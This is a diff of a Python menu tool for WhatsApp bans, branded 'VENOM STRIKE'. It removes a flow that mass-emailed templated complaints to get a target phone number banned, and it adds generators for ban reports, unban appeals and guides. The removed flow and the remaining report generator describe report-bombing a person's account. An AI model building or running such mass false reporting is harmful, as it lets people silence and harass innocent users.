         elif choice == "3":
-            handle_operation(bomber, "unban", "temporary")
-        elif choice == "4":
-            handle_operation(bomber, "unban", "permanent")
+            show_guide_menu()
         elif choice == "0":
-            print(Fore.YELLOW + "\n👋 Exiting system...")
+            print(Fore.YELLOW + "\n👋 Exiting...")
             break
         else:
-            print(Fore.RED + "\n❌ Invalid option!")
+            print(Fore.RED + "\n❌ Invalid!")
             time.sleep(1)
 
-def handle_operation(bomber, op_type, sub_type):
+def generate_ban_menu():
     clear()
     print_banner()
     
-    if op_type == "ban":
-        print(Fore.RED + "\n" + "═" * 60)
-        print(Fore.YELLOW + f"🚫 {sub_type.upper()} BAN OPERATION")
-        print(Fore.RED + "═" * 60)
-        
-        phone = input(Fore.YELLOW + f"\n📞 Enter number to {sub_type.upper()} BAN: ").strip()
-        
-        if not validate_phone(phone):
-            print(Fore.RED + "❌ Invalid number!")
-            time.sleep(2)
-            return
-        
-        confirm = input(Fore.RED + f"\n⚠️  Confirm {sub_type.upper()} BAN on {phone}? (y/n): ").lower()
-        if confirm != 'y':
-            print(Fore.YELLOW + "❌ Operation cancelled.")
-            return
-        
-        template = get_ban_template(phone, sub_type)
-        repetitions = BAN_REPETITIONS
-        
-    else:  # unban
-        print(Fore.GREEN + "\n" + "═" * 60)
-        print(Fore.CYAN + f"✅ {sub_type.upper()} UNBAN OPERATION")
-        print(Fore.GREEN + "═" * 60)
-        
-        phone = input(Fore.YELLOW + f"\n📞 Enter number to {sub_type.upper()} UNBAN: ").strip()
-        
-        if not validate_phone(phone):
-            print(Fore.RED + "❌ Invalid number!")
-            time.sleep(2)
-            return
-        
-        confirm = input(Fore.GREEN + f"\n⚠️  Confirm {sub_type.upper()} UNBAN on {phone}? (y/n): ").lower()
-        if confirm != 'y':
-            print(Fore.YELLOW + "❌ Operation cancelled.")
-            return
-        
-        template = get_unban_template(phone, sub_type)
-        repetitions = UNBAN_REPETITIONS
+    print(Fore.CYAN + "\n" + "─" * 30)
+    print(Fore.YELLOW + "🚫 BAN REPORT GENERATOR")
+    print(Fore.CYAN + "─" * 30)
     
-    print(Fore.CYAN + f"\n🔧 Starting operation...")
-    time.sleep(1)
+    # Select ban type
+    print(Fore.GREEN + "\n1. TEMPORARY BAN REPORT")
+    print(Fore.GREEN + "2. PERMANENT BAN REPORT")
     
-    # Launch the attack
-    total_sent = bomber.launch_massive_attack(
-        template["subject"],
-        template["body"],
-        repetitions,
-        f"{sub_type} {op_type}"
-    )
+    ban_choice = input(Fore.YELLOW + "\nSelect ban type: ").strip()
     
-    # Show result
-    if op_type == "ban":
-        print(Fore.RED + "\n" + "🚫" * 30)
-        print(Fore.RED + f"✅ BAN OPERATION COMPLETE!")
-        print(Fore.CYAN + f"   📞 Target: {phone}")
-        print(Fore.CYAN + f"   📧 Emails sent: {total_sent:,}")
-        print(Fore.GREEN + f"   ⏳ Check number status in 5-10 minutes")
-        print(Fore.RED + "🚫" * 30)
+    if ban_choice == "1":
+        ban_type = "temporary"
+    elif ban_choice == "2":
+        ban_type = "permanent"
     else:
-        print(Fore.GREEN + "\n" + "✅" * 30)
-        print(Fore.GREEN + f"✅ UNBAN OPERATION COMPLETE!")
-        print(Fore.CYAN + f"   📞 Target: {phone}")
-        print(Fore.CYAN + f"   📧 Emails sent: {total_sent:,}")
-        print(Fore.GREEN + f"   ⏳ Check account status in 2-3 hours")
-        print(Fore.GREEN + "✅" * 30)
+        print(Fore.RED + "\n❌ Invalid choice!")
+        time.sleep(1)
+        return
     
-    stats["total_operations"] += 1
+    # Get phone number
+    phone = input(Fore.YELLOW + f"\nEnter scammer's phone number: ").strip()
     
-    input(Fore.CYAN + "\n↵ Press Enter to continue...")
+    if not validate_phone(phone):
+        print(Fore.RED + "\n❌ Invalid phone number format!")
+        print(Fore.YELLOW + "Use format: +1234567890")
+        time.sleep(2)
+        return
+    
+    # Generate report
+    clear()
+    print_banner()
+    print(Fore.GREEN + f"\n✅ GENERATING {ban_type.upper()} BAN REPORT")
+    print(Fore.CYAN + "─" * 50)
+    
+    report = generate_ban_report(phone, ban_type)
+    print(Fore.WHITE + report)
+    
+    print(Fore.CYAN + "─" * 50)
+    print(Fore.YELLOW + "\n📋 HOW TO USE THIS REPORT:")
+    print(Fore.WHITE + "1. Copy the report above")
+    print(Fore.WHITE + f"2. Email to: support@support.whatsapp.com")
+    print(Fore.WHITE + "3. Include screenshots as evidence")
+    print(Fore.WHITE + "4. Wait 24-48 hours for response")
+    
+    # Save to file option
+    save = input(Fore.YELLOW + "\nSave to file? (y/n): ").lower()
+    if save == 'y':
+        filename = f"ban_report_{phone.replace('+', '')}.txt"
+        with open(filename, 'w') as f:
+            f.write(report)
+        print(Fore.GREEN + f"✅ Report saved as {filename}")
+    
+    input(Fore.CYAN + "\nPress Enter to continue...")
 
-# ===== Main Execution =====
+def generate_unban_menu():
+    clear()
+    print_banner()
+    
+    print(Fore.CYAN + "\n" + "─" * 30)
+    print(Fore.YELLOW + "✅ UNBAN APPEAL GENERATOR")
+    print(Fore.CYAN + "─" * 30)
+    
+    # Select ban type
+    print(Fore.GREEN + "\n1. TEMPORARY BAN APPEAL")
+    print(Fore.GREEN + "2. PERMANENT BAN APPEAL")
+    
+    ban_choice = input(Fore.YELLOW + "\nWhat type of ban?: ").strip()
+    
+    if ban_choice == "1":
+        ban_type = "temporary"
+    elif ban_choice == "2":
+        ban_type = "permanent"
+    else:
+        print(Fore.RED + "\n❌ Invalid choice!")
+        time.sleep(1)
+        return
+    
+    # Get user information
+    print(Fore.CYAN + "\n" + "─" * 30)
+    print(Fore.YELLOW + "📝 USER INFORMATION")
+    print(Fore.CYAN + "─" * 30)
+    
+    phone = input(Fore.YELLOW + "\nYour phone number: ").strip()
+    
+    if not validate_phone(phone):
+        print(Fore.RED + "\n❌ Invalid phone number format!")
+        print(Fore.YELLOW + "Use format: +1234567890")
+        time.sleep(2)
+        return
+    
+    name = input(Fore.YELLOW + "Your name: ").strip()
+    
+    print(Fore.GREEN + "\nSelect appeal reason:")
+    print(Fore.WHITE + "1. False positive / Automated system error")
+    print(Fore.WHITE + "2. Mass false reporting by others")
+    print(Fore.WHITE + "3. Identity confusion / Someone impersonated me")
+    print(Fore.WHITE + "4. Technical error during update")
+    print(Fore.WHITE + "5. I apologize for unintentional violation")
+    
+    reason_choice = input(Fore.YELLOW + "\nSelect reason (1-5): ").strip()
+    
+    reasons = {
+        "1": "False positive / Automated system error",
+        "2": "Mass false reporting by others",
+        "3": "Identity confusion / Someone impersonated me",
+        "4": "Technical error during update",
+        "5": "Apology for unintentional violation"
+    }
+    
+    reason = reasons.get(reason_choice, "Appeal for account review")
+    
+    # Generate appeal
+    clear()
+    print_banner()
+    print(Fore.GREEN + f"\n✅ GENERATING {ban_type.upper()} UNBAN APPEAL")
+    print(Fore.CYAN + "─" * 50)
+    
+    appeal = generate_unban_appeal(phone, ban_type, name, reason)
+    print(Fore.WHITE + appeal)
+    
+    print(Fore.CYAN + "─" * 50)
+    print(Fore.YELLOW + "\n📋 HOW TO SUBMIT THIS APPEAL:")
+    print(Fore.WHITE + "1. Copy the entire appeal above")
+    print(Fore.WHITE + "2. Open WhatsApp on your banned phone")
+    print(Fore.WHITE + "3. When ban screen appears, tap 'Support'")
+    print(Fore.WHITE + "4. Paste the appeal in the message field")
+    print(Fore.WHITE + "5. Submit and wait for response")
+    
+    if ban_type == "temporary":
+        print(Fore.GREEN + "\n⏰ Expected response: 24-72 hours")
+    else:
+        print(Fore.GREEN + "\n⏰ Expected response: 3-7 days")
+    
+    # Save to file option
+    save = input(Fore.YELLOW + "\nSave to file? (y/n): ").lower()
+    if save == 'y':
+        filename = f"unban_appeal_{phone.replace('+', '')}.txt"
+        with open(filename, 'w') as f:
+            f.write(appeal)
+        print(Fore.GREEN + f"✅ Appeal saved as {filename}")
+    
+    input(Fore.CYAN + "\nPress Enter to continue...")
+
+def show_guide_menu():
+    clear()
+    print_banner()
+    
+    print(Fore.CYAN + "\n" + "─" * 30)
+    print(Fore.YELLOW + "📚 OFFICIAL GUIDES")
+    print(Fore.CYAN + "─" * 30)
+    
+    print(Fore.GREEN + "\n1. UNBAN APPEAL GUIDE")
+    print(Fore.GREEN + "2. BAN REPORTING GUIDE")
+    
+    choice = input(Fore.YELLOW + "\nSelect guide: ").strip()
+    
+    if choice == "1":
+        show_official_guide("unban")
+    elif choice == "2":
+        show_official_guide("ban")
+    else:
+        print(Fore.RED + "\n❌ Invalid choice!")
+        time.sleep(1)
+
+# ===== Main Program =====
 if __name__ == "__main__":
     try:
         if login():
             main_menu()
     except KeyboardInterrupt:
-        print(Fore.YELLOW + "\n\n👋 Operation interrupted")
+        print(Fore.YELLOW + "\n\n👋 Program stopped")
     except Exception as e:
-        print(Fore.RED + f"\n⚠️  System error: {e}")
+        print(Fore.RED + f"\n⚠️  Error: {str(e)[:50]}")
     finally:
-        print(Fore.CYAN + "\n🔥 WhatsApp Control System v2.0")
-        print(Fore.YELLOW + "📞 Professional operations complete")
+        print(Fore.CYAN + "\n" + "─" * 30)
+        print(Fore.YELLOW + "VENOM STRIKE")
+        print(Fore.GREEN + "BY TUNZY SHOP")
+        print(Fore.CYAN + "─" * 30)
